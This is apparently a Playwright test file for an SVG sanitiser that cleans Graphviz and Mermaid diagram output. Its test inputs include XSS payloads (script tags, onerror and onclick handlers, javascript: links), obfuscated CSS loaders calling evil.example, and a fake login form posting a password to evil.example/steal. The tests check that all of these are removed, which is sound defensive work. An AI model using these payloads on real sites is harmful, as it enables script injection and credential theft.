import { test, expect } from "@playwright/test";
import { JSDOM } from "jsdom";
import { inertCss, sanitizeCompiledSvg, sanitizeRenderedSvg } from "@/lib/svg-sanitize";

// sanitizeCompiledSvg uses the browser's DOMParser/XMLSerializer — it only
// ever runs client-side, after a dynamic ssr:false import in
// DiagramBlock.tsx — so this Node-based test runner needs jsdom to provide
// those globals. Phase 4 of PLAN-rich-markdown-blocks.md: Graphviz's DOT
// language supports HTML-like labels and per-node/edge URL/href attributes,
// either of which could carry a script or a javascript:/data: URI through
// to the rendered SVG without this sanitization step.
const dom = new JSDOM();
Object.assign(globalThis, {
  DOMParser: dom.window.DOMParser,
  XMLSerializer: dom.window.XMLSerializer,
});

const SVG_NS = 'xmlns="http://www.w3.org/2000/svg"';
const XLINK_NS = 'xmlns:xlink="http://www.w3.org/1999/xlink"';

test.describe("sanitizeCompiledSvg", () => {
  test("passes benign SVG through with its content intact", () => {
    const svg = `<svg ${SVG_NS}><circle cx="5" cy="5" r="4"/></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out).toContain("<circle");
    expect(out).toContain('cx="5"');
  });

  test("strips <script> elements entirely, keeping sibling content", () => {
    const svg = `<svg ${SVG_NS}><script>alert(1)</script><circle r="1"/></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out).not.toContain("<script");
    expect(out).not.toContain("alert(1)");
    expect(out).toContain("<circle");
  });

  test("strips foreignObject elements (HTML/script smuggling vector)", () => {
    const svg = `<svg ${SVG_NS}><foreignObject><div>x</div></foreignObject><circle r="1"/></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out.toLowerCase()).not.toContain("foreignobject");
    expect(out).toContain("<circle");
  });

  test("strips on* event handler attributes from any element", () => {
    const svg = `<svg ${SVG_NS}><rect onclick="alert(1)" onmouseover="alert(2)" width="1" height="1"/></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out).not.toContain("onclick");
    expect(out).not.toContain("onmouseover");
    expect(out).toContain("<rect");
  });

  test("strips a javascript: xlink:href (Graphviz URL/href attribute vector)", () => {
    const svg = `<svg ${SVG_NS} ${XLINK_NS}><a xlink:href="javascript:alert(1)"><text>node</text></a></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out).not.toContain("javascript:");
  });

  test("strips a data: href", () => {
    const svg = `<svg ${SVG_NS}><a href="data:text/html,evil"><text>x</text></a></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out).not.toContain("data:");
  });

  test("keeps a safe https href on an <a> element", () => {
    const svg = `<svg ${SVG_NS}><a href="https://example.com"><text>node</text></a></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out).toContain("https://example.com");
  });

  test("keeps a safe fragment href", () => {
    const svg = `<svg ${SVG_NS}><a href="#node1"><text>x</text></a></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out).toContain('href="#node1"');
  });

  test("a <style> keeps its rules but loads nothing: no @import, no external url()", () => {
    const svg = `<svg ${SVG_NS}><style>@import url("https://evil.example/a.css"); .n{fill:url(#grad);background:url('https://evil.example/t.png')}</style><rect class="n"/></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("@import");
    expect(out).toContain("url(#grad)");
    expect(out).toContain(".n{fill:");
  });

  test("same-document references survive in every spelling, and inline data: does too", () => {
    for (const ref of ['url(#g)', 'url("#g")', "url('#g')", "url( #g )", "url(data:image/png;base64,AAAA)"]) {
      expect(inertCss(`.n{fill:${ref}}`)).toBe(`.n{fill:${ref}}`);
    }
  });

  test("escaped, commented, string-form and unterminated loaders are all neutralised", () => {
    const hostile = [
      ".a{background:\\75rl(https://evil.example/t.png)}",
      '@\\69mport "https://evil.example/a.css";',
      ".a{background:u/**/rl(https://evil.example/t.png)}",
      '.a{background:image-set("https://evil.example/x.png" 1x)}',
      ".a{background:URL( 'https://evil.example/t.png' )}",
      ".a{background:url(https://evil.example/never-closed",
      ".a{background:url(//evil.example/t.png)}",
      // One pass would leave these two behind as live loaders.
      ".a{background:\\5c\\5c 75rl(https://evil.example/t.png)}",
      ".a{background:\\\\5c 75rl(https://evil.example/t.png)}",
      '@im@import;port "https://evil.example/a.css";',
    ];
    for (const css of hostile) expect(inertCss(css), css).not.toContain("evil.example");
  });

  test("a style attribute is filtered like a <style> element", () => {
    const svg = `<svg ${SVG_NS}><rect style="mask-image:url(https://evil.example/p.png);fill:url(#g)"/></svg>`;
    const out = sanitizeCompiledSvg(svg);
    expect(out).not.toContain("evil.example");
    expect(out).toContain("url(#g)");
  });

  test("returns empty string for unparseable input", () => {
    expect(sanitizeCompiledSvg("not svg at all { garbage")).toBe("");
  });

  test("returns empty string when the root element isn't <svg>", () => {
    expect(sanitizeCompiledSvg("<div>not an svg</div>")).toBe("");
  });
});

test.describe("sanitizeRenderedSvg (Mermaid on the page)", () => {
  // What Mermaid hands back: HTML serialisation, labels in <foreignObject>, unclosed <br>.
  const mermaid = (extra = "", style = ".node rect{fill:#eee}") =>
    `<svg id="m1" ${SVG_NS} viewBox="0 0 100 50"><style>${style}</style><g class="node"><rect width="80" height="30"></rect>` +
    `<foreignObject width="80" height="30"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Deploy<br>to prod</span>${extra}</div></foreignObject></g></svg>`;

  test("keeps the diagram and its HTML labels, unclosed <br> and all", () => {
    const root = sanitizeRenderedSvg(mermaid());
    expect(root?.nodeName.toLowerCase()).toBe("svg");
    expect(root?.querySelector("foreignObject .nodeLabel")?.textContent).toBe("Deployto prod");
    expect(root?.querySelector("rect")).not.toBeNull();
  });

  test("themeCSS cannot load from another host", () => {
    const root = sanitizeRenderedSvg(mermaid("", '.x{background:url(https://evil.example/b.png)} @import "https://evil.example/a.css"; .y{fill:url(#g)}'));
    const css = root?.querySelector("style")?.textContent ?? "";
    expect(css).not.toContain("evil.example");
    expect(css).toContain("url(#g)");
  });

  test("handlers, script links and form controls inside a label are removed", () => {
    const root = sanitizeRenderedSvg(
      mermaid('<img src="x" onerror="alert(1)"><a href="javascript:alert(1)">x</a><form action="https://evil.example/steal"><input name="password"><button>Sign in</button></form><iframe src="https://evil.example"></iframe>'),
    );
    const html = root?.outerHTML ?? "";
    for (const gone of ["onerror", "javascript:", "<form", "<input", "<button", "<iframe", "evil.example"]) {
      expect(html, gone).not.toContain(gone);
    }
    expect(root?.querySelector(".nodeLabel")).not.toBeNull();
  });

  test("anything that is not exactly one <svg> is refused", () => {
    expect(sanitizeRenderedSvg("<div>not a diagram</div>")).toBeNull();
    expect(sanitizeRenderedSvg(`${mermaid()}<script>alert(1)</script>`)).toBeNull();
    expect(sanitizeRenderedSvg("")).toBeNull();
  });
});
